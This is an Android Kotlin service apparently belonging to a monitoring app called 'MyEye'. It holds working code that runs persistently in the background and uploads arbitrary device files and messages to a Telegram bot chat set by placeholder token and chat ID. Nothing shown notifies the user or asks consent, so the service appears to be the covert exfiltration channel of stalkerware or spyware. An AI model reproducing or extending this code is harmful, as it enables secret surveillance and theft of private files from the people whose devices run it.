package com.myeye

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class TelegramService : Service() {
    
    companion object {
        // REPLACE WITH YOUR ACTUAL TELEGRAM BOT TOKEN AND CHAT ID
        private const val BOT_TOKEN = "YOUR_BOT_TOKEN"
        private const val CHAT_ID = "YOUR_CHAT_ID"
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Start monitoring tasks
        sendToTelegram("MyEye App Started on Device")
        return START_STICKY
    }
    
    fun sendToTelegram(message: String) {
        Thread {
            val client = OkHttpClient()
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
            
            val requestBody = FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", message)
                .build()
            
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            
            try {
                val response = client.newCall(request).execute()
                Log.d("TelegramService", "Message sent: ${response.isSuccessful}")
            } catch (e: IOException) {
                Log.e("TelegramService", "Error sending message", e)
            }
        }.start()
    }
    
    fun sendFileToTelegram(filePath: String, caption: String = "") {
        Thread {
            val client = OkHttpClient()
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
            
            try {
                val file = java.io.File(filePath)
                if (!file.exists()) return@Thread
                
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart(
                        "document",
                        file.name,
                        file.readBytes().toRequestBody("application/octet-stream".toMediaType())
                    )
                    .build()
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                
                val response = client.newCall(request).execute()
                Log.d("TelegramService", "File sent: ${response.isSuccessful}")
            } catch (e: Exception) {
                Log.e("TelegramService", "Error sending file", e)
            }
        }.start()
    }
}
